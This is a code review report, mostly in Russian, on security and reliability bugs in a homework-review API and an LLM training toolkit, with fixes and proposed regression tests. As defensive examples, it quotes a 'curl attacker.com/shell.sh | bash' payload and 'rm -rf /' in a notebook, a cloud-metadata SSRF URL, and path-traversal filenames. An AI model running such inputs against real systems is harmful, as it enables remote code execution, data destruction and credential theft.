# Bug-focused Code Review Report

**Scope:** весь репозиторий (`review_assistant_repo` + `homework_reviewer_llm`)
**Date:** 2026-04-11

---

## P0 -- CRITICAL (безопасность / гарантированная потеря данных)

### C-1. Path Traversal при загрузке файлов
**File:** `review_assistant_repo/app/services/review_service.py` (строки 152-155)
**Function:** `ReviewService.upload_project`

```python
# Текущий код -- имя файла берётся из пользовательского ввода без санитизации
destination = project_dir / (original_filename or Path(uploaded_file_path).name)
shutil.copy(uploaded_file_path, destination)
```

**Сценарий сбоя:** клиент отправляет `filename="../../../../etc/cron.d/evil"`. `destination` резолвится за пределами `files_root`, `shutil.copy` пишет файл в произвольное место на диске.

**Импакт:** произвольная запись файлов на сервере (RCE через cron/shell profiles, перезапись конфигов, подмена данных).

**Фикс:**
```python
safe_name = Path(original_filename or Path(uploaded_file_path).name).name  # strip dirs
destination = project_dir / safe_name
assert destination.resolve().is_relative_to(Path(settings.files_root).resolve()), \
    "Path traversal blocked"
```

---

### C-2. SSRF через RL Open-Source HTTP Environment
**File:** `review_assistant_repo/app/routers/rl.py` (строка 104)
**Function:** `run_rl_episode`

```python
@router.post("/rl/episodes/run", response_model=EpisodeRunResponse)
def run_rl_episode(request: EpisodeRunRequest) -> EpisodeRunResponse:
    engine = RLExperimentEngine()
    # ... no auth dependency
```

**File:** `review_assistant_repo/app/rl/environments.py` (строки 60-73)
```python
class OpenSourceHttpEnvironment:
    def __init__(self, *, base_url: str, reset_path: str, step_path: str, timeout_sec: float):
        self._base_url = base_url.rstrip("/")  # user-controlled URL
```

**Сценарий сбоя:** `POST /api/v1/rl/episodes/run` с `environment=open_source_http` и `base_url=http://169.254.169.254/latest/meta-data/` -- сервер делает HTTP-запросы к cloud metadata или внутренним сервисам.

**Импакт:** SSRF -- чтение cloud credentials, сканирование внутренней сети, потенциальная эскалация привилегий.

**Фикс:**
1. Добавить `Depends(require_user_for_rl_writes)` к `run_rl_episode`.
2. Ввести allowlist хостов/схем для `open_source_http` или отключить это окружение при `app_env != "dev"`.
3. Добавить ограничения: запретить `169.254.x.x`, `10.x.x.x`, `172.16-31.x.x`, `127.x.x.x`, `localhost`.

---

### C-3. RCE через выполнение произвольных Notebook
**File:** `review_assistant_repo/app/services/notebook_execution.py` (строки 77-82)
```python
client = NotebookClient(
    nb,
    timeout=int(timeout_sec),
    # No sandboxing — executes all cells with API process privileges
)
```

**Сценарий сбоя:** пользователь загружает `.ipynb` с `!rm -rf /` или `import os; os.system("curl attacker.com/shell.sh | bash")`. При `enable_notebook_execution=True` (по умолчанию!) все ячейки исполняются с правами процесса.

**Импакт:** полный Remote Code Execution на сервере ревью.

**Фикс:**
1. **Немедленно:** `enable_notebook_execution: bool = False` по умолчанию в `config.py`.
2. **Стратегически:** запуск через изолированный контейнер или subprocess с `--no-network`, cgroup-лимитами, отдельным пользователем, rlimit на время и память.

---

## P0 -- HIGH (корректность, data loss, race conditions)

### H-1. Race Condition: дублирование async review jobs
**File:** `review_assistant_repo/app/routers/projects.py` (строки 601-629)

```python
# TOCTOU: check-then-act без блокировки строки
project = db.get(Project, project_id)
if project.status == "processing":          # check
    raise HTTPException(...)
active = db.query(ReviewJob).filter(...).first()  # check
if active:
    raise HTTPException(...)
# ... insert new job                        # act  (no atomicity)
db.add(job)
project.status = "processing"
db.commit()
```

**Сценарий:** два параллельных `POST .../review/async` проходят оба check-а, оба вставляют `ReviewJob`, оба ставят `processing`. Результат: два параллельных ревью одного проекта, гонка данных, испорченные результаты.

**Модель `ReviewJob` не имеет уникального constraint на `(project_id, status)`:**
```python
# review_assistant_repo/app/models.py:140-151 — нет UniqueConstraint
class ReviewJob(Base):
    __tablename__ = "review_jobs"
    id: Mapped[str] = mapped_column(String(36), primary_key=True)
    project_id: Mapped[str] = mapped_column(String(36), ...)
    status: Mapped[str] = mapped_column(String(32), ...)
    # ... нет constraint на уникальность active job per project
```

**Фикс:**
```sql
-- Alembic migration
CREATE UNIQUE INDEX ix_review_jobs_project_active
ON review_jobs (project_id)
WHERE status IN ('queued', 'running');
```
Или на уровне кода: `SELECT ... FOR UPDATE` на строку `Project` перед проверками.

---

### H-2. Утечка temp-файлов при неожиданных исключениях (upload)
**File:** `review_assistant_repo/app/routers/projects.py` (строки 280-318)

```python
tmp_file_path = None
if file:
    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
        # ... write
        tmp_file_path = tmp.name
try:
    project = service.upload_project(...)
except ValueError as exc:
    if tmp_file_path:
        Path(tmp_file_path).unlink(missing_ok=True)  # cleanup only on ValueError!
    raise ...
if tmp_file_path:
    Path(tmp_file_path).unlink(missing_ok=True)  # cleanup on success
# НО: IntegrityError, shutil error, Supabase error, любое другое Exception
#     -> tmp_file_path остаётся на диске навсегда
```

**Фикс:** обернуть в `finally`:
```python
try:
    project = service.upload_project(...)
except ValueError as exc:
    raise HTTPException(status_code=400, detail=str(exc)) from exc
finally:
    if tmp_file_path:
        Path(tmp_file_path).unlink(missing_ok=True)
```

---

### H-3. Alembic failure -- тихий fallback на `create_all` в production
**File:** `review_assistant_repo/app/main.py` (строки 44-50)

```python
try:
    cfg = Config(str(alembic_ini))
    command.upgrade(cfg, "head")
except Exception as exc:
    log.warning("Alembic upgrade failed (%s); falling back to create_all", exc)
    Base.metadata.create_all(bind=engine)  # ← danger: schema divergence
```

**Сценарий:** в production Alembic не может применить миграцию (ошибка SQL, отсутствие прав, transient failure). Код тихо делает `create_all`, что не записывает alembic version, не прогоняет data migrations, и может создать таблицы с неправильной схемой.

**Фикс:**
```python
if settings.app_env in ("production", "staging"):
    raise  # fail fast
else:
    log.warning("Alembic failed, falling back to create_all (dev only)")
    Base.metadata.create_all(bind=engine)
```

---

### H-4. Потеря данных: dedupe по 2000-символьному префиксу
**File:** `homework_reviewer_llm/src/homework_reviewer_llm/sanitize.py` (строки 81-91)

```python
def dedupe_by_submission_hash(records):
    for r in records:
        payload = f"{r.student_id}\n{r.assignment_id}\n{r.submission_text[:2000]}".encode()
        key = hashlib.sha256(payload).hexdigest()
```

**Сценарий:** два разных submission одного студента по одному заданию с одинаковым началом (template, boilerplate, import-блок), но разным содержимым после 2000 символов. Второй submission отбрасывается -- **потеря данных обучающего набора** без предупреждения.

**Фикс:** хешировать полный `submission_text`:
```python
payload = f"{r.student_id}\n{r.assignment_id}\n{r.submission_text}".encode()
```

---

### H-5. File download без проверки path traversal
**File:** `review_assistant_repo/app/routers/projects.py` (строки 1004-1014, 1027)

```python
def download_project_file(project_id, file_id, db):
    row = db.get(ProjectFile, file_id)
    path = Path(row.storage_path)
    if not path.exists():
        raise HTTPException(...)
    return FileResponse(path, filename=path.name)
    # ← нет проверки, что path внутри files_root!
```

**Сценарий:** если `storage_path` в DB содержит абсолютный путь за пределами `files_root` (от C-1 или от ручной модификации DB), `FileResponse` отдаст любой файл, доступный процессу.

**Фикс:**
```python
resolved = path.resolve()
if not resolved.is_relative_to(Path(get_settings().files_root).resolve()):
    raise HTTPException(status_code=403, detail="Access denied")
```

---

### H-6. Блокирующий sync-код в async endpoint (upload)
**File:** `review_assistant_repo/app/routers/projects.py` (строка 250)

```python
async def upload_project(...):
    # ...
    project = service.upload_project(...)  # SYNC: DB commits, shutil.copy, Supabase upload
```

**Сценарий:** `service.upload_project()` выполняет синхронные I/O (SQLAlchemy commit, `shutil.copy`, HTTP POST к Supabase) прямо в event loop. Под нагрузкой блокирует все остальные корутины (WebSocket, другие запросы).

**Фикс:** обернуть в `asyncio.to_thread(service.upload_project, ...)` или сделать endpoint синхронным (`def upload_project`).

---

### H-7. JWT ошибки отдаются клиенту в detail
**File:** `review_assistant_repo/app/auth/deps.py` (строка 50)

```python
except Exception as exc:
    raise HTTPException(status_code=401, detail=f"Invalid token: {exc}") from exc
```

**Импакт:** `exc` может содержать информацию о конфигурации (JWKS URL, ключи, сетевые ошибки). Утечка полезной атакующему информации.

**Фикс:**
```python
except Exception as exc:
    logger.warning("JWT decode failed: %s", exc)
    raise HTTPException(status_code=401, detail="Invalid token") from exc
```

---

## P1 -- MEDIUM (стабильность, reliability)

### M-1. Capture pool: таймаут не останавливает реальную работу
**File:** `review_assistant_repo/app/capture/pool.py` (строки 66-74)

```python
fut = ex.submit(fn, *args, **kwargs)
try:
    return fut.result(timeout=float(settings.capture_pool_timeout_sec))
except FuturesTimeout:
    fut.cancel()  # ← cancel() не останавливает уже запущенный thread!
    raise TimeoutError(...)
```

Playwright-worker продолжает держать браузер. Под нагрузкой -- pile-up abandoned threads с открытыми браузерами.

**Фикс:** передавать `threading.Event` в capture-функции для cooperative cancellation. Или использовать `subprocess` для изоляции и `kill`.

---

### M-2. Capture executor shutdown без ожидания
**File:** `review_assistant_repo/app/capture/pool.py` (строки 27-28)

```python
_executor.shutdown(wait=False, cancel_futures=False)
```

Может оставить orphaned Playwright процессы при hot reload или graceful shutdown.

**Фикс:** `shutdown(wait=True, cancel_futures=True)` + таймаут.

---

### M-3. RL train: concurrent cap проверяется неатомарно
**File:** `review_assistant_repo/app/rl/train_jobs.py` (строки 118-121)

```python
if count_active_train_jobs(db) >= settings.rl_train_max_concurrent:
    raise RLTrainConcurrentLimitError(...)
# ... then insert job
```

Два параллельных запроса могут пройти проверку одновременно и оба вставить job.

**Фикс:** advisory lock или `INSERT ... SELECT ... HAVING count(*) < max`.

---

### M-4. LLM service кэшируется навсегда
**File:** `review_assistant_repo/app/llm/service.py` (строки 47-49)

```python
@lru_cache(maxsize=1)
def get_llm_service() -> LLMService:
    return LLMService()
```

Изменение настроек (API key, model, base_url) не отражается до перезапуска процесса.

**Фикс:** привязать к хэшу настроек или использовать `TTLCache`.

---

### M-5. Тихий пустой ответ LLM
**File:** `review_assistant_repo/app/llm/client.py` (строка 70)

```python
content = (data.get("choices") or [{}])[0].get("message", {}).get("content") or ""
```

Если API возвращает пустой `choices` или неожиданный формат, `content = ""` -- успех с пустой строкой. Невозможно отличить "модель вернула пустоту" от "API сломался".

**Фикс:** проверять `len(choices) > 0` и наличие `message.content`, иначе raise.

---

### M-6. WebSocket без аутентификации
**File:** `review_assistant_repo/app/routers/projects.py` (строки 658-677)

```python
async def project_status_websocket(websocket: WebSocket, project_id: str):
    await websocket.accept()
    # No auth check — anyone can poll status for any project_id
```

Зная или перебирая UUID, можно отслеживать статус чужих ревью.

**Фикс:** требовать токен в query string или первом сообщении.

---

### M-7. `run_review_background` -- `ValueError` всегда = `project_not_found`
**File:** `review_assistant_repo/app/services/review_tasks.py` (строки 48-56)

```python
except ValueError:
    _touch_job(db, job_id, status="failed", error_message="project_not_found", ...)
```

Любой `ValueError` из пайплайна будет помечен как "project not found", включая будущие validation errors.

**Фикс:** использовать кастомное исключение `ProjectNotFoundError(ValueError)`.

---

### M-8. evaluate.py: KeyError на некорректных строках
**File:** `homework_reviewer_llm/scripts/evaluate.py` (строка 46)

```python
obj = json.loads(line)
pred_by_id[str(obj["id"])] = obj["raw"]  # KeyError if "id" or "raw" missing
```

Одна битая строка останавливает весь скрипт evaluation.

**Фикс:** defensive access + skip + counter:
```python
obj = json.loads(line)
if "id" not in obj or "raw" not in obj:
    skipped += 1; continue
```

---

### M-9. evaluate.py: дублирующиеся id тихо перезаписываются
**File:** `homework_reviewer_llm/scripts/evaluate.py` (строки 30-46)

Если в gold JSONL или pred JSONL есть строки с одинаковым `id`, последняя перезатирает предыдущую. Метрики считаются по неправильным парам.

**Фикс:** детектировать дубликаты и warn/fail.

---

### M-10. v2 guardrails пропускают дублирование factor_id
**File:** `homework_reviewer_llm/src/homework_reviewer_llm/guardrails.py` (строка 90)

```python
ids_found = {item.factor_id for item in out.factor_analysis}
missing = FACTOR_IDS - ids_found
```

`factor_analysis` с 2x `submission` + `revision_history` + `student_profile` пройдёт валидацию, хотя содержит дубликаты.

**Фикс:**
```python
if len(out.factor_analysis) != len(FACTOR_IDS):
    errors.append(f"factor_analysis: expected {len(FACTOR_IDS)} items, got {len(out.factor_analysis)}")
```

---

### M-11. `overall_score` не ограничен в Pydantic
**File:** `homework_reviewer_llm/src/homework_reviewer_llm/schema.py` (строки 57, 104)

```python
class ReviewOutput(BaseModel):
    overall_score: float  # No bounds!

class ReviewOutputV2(BaseModel):
    overall_score: float  # No bounds!
```

Модель может вернуть `150` или `-10`, что сломает MAE и downstream-логику.

**Фикс:** `overall_score: float = Field(ge=0, le=100)`.

---

### M-12. Inference на non-CUDA не перемещает inputs на device
**File:** `homework_reviewer_llm/scripts/inference_mvp.py` (строки 109-110)

```python
if torch.cuda.is_available():
    inputs = {k: v.cuda() for k, v in inputs.items()}
# MPS (Apple Silicon) — model на GPU, inputs на CPU → RuntimeError
```

**Фикс:**
```python
device = next(model.parameters()).device
inputs = {k: v.to(device) for k, v in inputs.items()}
```

---

## P1 -- LOW (стиль, UX, maintainability)

### L-1. Greedy JSON extraction
**File:** `review_assistant_repo/app/llm/client.py` (строка 36)

`re.search(r"\{[\s\S]*\}", text)` -- greedy regex захватывает максимально длинный match; при нескольких JSON-блоках в ответе может собрать невалидный блок.

**Фикс:** использовать balanced-brace parser или non-greedy `\{[\s\S]*?\}`.

---

### L-2. Supabase upload error проглатывается
**File:** `review_assistant_repo/app/services/review_service.py` (строки 157-164)

```python
except Exception as exc:
    meta.setdefault("supabase_upload_error", str(exc))
```

Upload "успешен" для клиента, но бэкап не создан. Нет способа узнать без проверки metadata.

**Фикс:** configurable `strict_supabase_upload` для production.

---

### L-3. `broad except` в optional auth
**File:** `review_assistant_repo/app/auth/deps.py` (строка 27)

```python
except Exception:
    return None
```

Маскирует любые баги в `decode_supabase_user` как "нет токена". В staging/prod баг может месяцами не обнаруживаться.

**Фикс:** `except jwt.PyJWTError:` + логирование неожиданных exceptions.

---

### L-4. pipeline_local.py -- merge_jsonl в память
**File:** `homework_reviewer_llm/scripts/pipeline_local.py` → `merge_jsonl`

`Path.read_text()` загружает весь файл в RAM. На больших SFT-корпусах -- OOM.

**Фикс:** streaming `open()` + line-by-line write.

---

### L-5. Contrastive CLI -- невалидный `--kinds` → traceback
**File:** `homework_reviewer_llm/scripts/build_contrastive_sft_jsonl.py`

`ContrastiveKind(part)` бросает `ValueError` без friendly message.

**Фикс:** `try/except ValueError: sys.exit(f"Unknown kind: {part}, allowed: {list(ContrastiveKind)}")`.

---

### L-6. DB engine без pool_pre_ping
**File:** `review_assistant_repo/app/db.py` (строка 25)

```python
_engine = create_engine(database_url, future=True, echo=False, connect_args=connect_args)
# No pool_pre_ping, no pool_size, no max_overflow
```

На PostgreSQL при потере соединения (restart, failover) -- первые запросы после reconnect могут падать с `DisconnectionError`.

**Фикс:** `pool_pre_ping=True`, настраиваемые `pool_size` и `max_overflow`.

---

## Оптимизации (Performance / Reliability / Maintainability)

| # | Файл | Что | Ожидаемый эффект |
|---|------|-----|-----------------|
| O-1 | `app/llm/client.py` | Переиспользовать `httpx.Client` (session) вместо создания нового клиента на каждый вызов `_post_chat_once` | Сокращение latency на 50-100ms (TLS handshake), снижение GC pressure |
| O-2 | `app/storage/supabase_storage.py` | Аналогично — shared `httpx.Client` с таймаутами из settings | Те же преимущества + connection reuse |
| O-3 | `app/routers/projects.py` (`project_status_websocket`) | Переиспользовать одну DB-сессию на WS-соединение вместо создания новой каждые 1.5s | Снижение churn соединений на ~40x |
| O-4 | `app/routers/projects.py` (`get_findings`) | Push фильтры (`severity`, `criterion_code`, `source_stage`, `category`) в SQL-запрос вместо `db.query().all()` + Python-фильтрация | Снижение нагрузки на DB и memory при больших проектах |
| O-5 | `app/rl/train_jobs.py` (`claim_next_accepted_train_job`) | Заменить SELECT+UPDATE на `UPDATE ... WHERE id = (SELECT ... LIMIT 1 FOR UPDATE SKIP LOCKED) RETURNING id` | Устранение race condition + один round-trip вместо двух |
| O-6 | `app/main.py` | Вынести миграции в init-container/job (Docker) вместо "migrate on startup" | Быстрый старт API-процессов + явные ошибки миграций |
| O-7 | `app/config.py` | Опасные дефолты (`require_auth_for_writes=False`, `enable_notebook_execution=True`) заблокировать за `app_env=dev` | Снижение вероятности misconfiguration в production |
| O-8 | `app/services/review_service.py` (`_run_review_pipeline`) | Batch insert для `Artifact` и `CriterionResult` | Снижение round-trips к DB при больших notebook'ах |
| O-9 | `app/retrieval/embed_backend.py` | Проверять `len(rows) == len(chunk)` при OpenAI embeddings response | Предотвращение silent misalignment текстов и векторов |
| O-10 | `homework_reviewer_llm/scripts/batch_inference.py` | `torch.inference_mode()` + explicit device alignment | ~10% speedup + корректная работа на MPS |

---

## Тестовые пробелы -- предложения по regression tests

### Для Critical:

| Finding | Предлагаемый тест |
|---------|-------------------|
| C-1 (Path Traversal) | `test_upload_path_traversal`: upload файл с `filename="../../etc/passwd"`, assert что файл создан только внутри `files_root` |
| C-2 (SSRF) | `test_rl_episode_requires_auth`: вызов `POST /rl/episodes/run` без токена при `require_auth_for_rl_writes=True` → 401 |
| C-3 (RCE notebook) | `test_notebook_execution_disabled_by_default`: при `app_env=production` проверить что `enable_notebook_execution=False` |

### Для High:

| Finding | Предлагаемый тест |
|---------|-------------------|
| H-1 (Race) | `test_concurrent_review_async`: 5 параллельных POST → ровно 1 job создан, остальные 409 |
| H-2 (Temp leak) | `test_upload_cleanup_on_unexpected_error`: mock `service.upload_project` raise RuntimeError → tmp file deleted |
| H-3 (Alembic) | `test_alembic_failure_in_production_raises`: mock `command.upgrade` raise → app startup fails (не fallback) |
| H-4 (Dedupe) | `test_dedupe_different_suffix`: два record с одинаковыми первыми 2000 символами но разным продолжением → оба сохранены |
| H-5 (FileResponse) | `test_download_rejects_path_outside_root`: записать `storage_path` с абсолютным путём → 403 |

### Для Medium:

| Finding | Предлагаемый тест |
|---------|-------------------|
| M-5 (Empty LLM) | `test_llm_empty_choices_raises`: mock response с `choices: []` → raise (не пустая строка) |
| M-8 (evaluate) | `test_evaluate_skips_bad_lines`: pred JSONL с одной строкой без `"id"` → скрипт продолжает |
| M-10 (factor_id) | `test_guardrails_v2_rejects_duplicate_factor_id`: factor_analysis с 2x `submission` → `ok=False` |
| M-11 (score bounds) | `test_overall_score_bounds`: `ReviewOutput(overall_score=150)` → `ValidationError` |

---

## Roadmap внедрения

```
P0 (неделя 1) — безопасность и корректность:
├── C-1  Path traversal fix + тест
├── C-2  SSRF: auth + allowlist для RL episodes
├── C-3  Disable notebook exec by default / sandbox
├── H-1  Unique constraint на active review jobs
├── H-2  finally-блок для temp files
├── H-3  Fail fast на Alembic в production
├── H-4  Full-text dedupe hash
└── H-5  Path validation на file download

P1 (неделя 2-3) — стабильность:
├── H-6  Sync upload → to_thread или def
├── H-7  Generic JWT error messages
├── M-1  Cooperative cancellation в capture pool
├── M-3  Atomic RL concurrent cap
├── M-5  LLM empty response validation
├── M-7  Custom ProjectNotFoundError
├── M-8  Defensive evaluate.py
├── M-10 Factor ID uniqueness in guardrails
├── M-11 Score bounds in Pydantic
└── M-12 Device-agnostic tensor placement

P2 (неделя 3-4) — оптимизации:
├── O-1  Shared httpx.Client for LLM
├── O-2  Shared httpx.Client for Supabase
├── O-3  WS session reuse
├── O-4  SQL-level filtering for findings
├── O-5  Atomic claim_next_accepted
├── O-6  Migrations in init-container
├── O-7  Safe defaults gated by app_env
├── O-8  Batch DB inserts in pipeline
├── O-9  Embedding response validation
├── O-10 inference_mode + device alignment
└── L-*  Low-priority code hygiene items
```
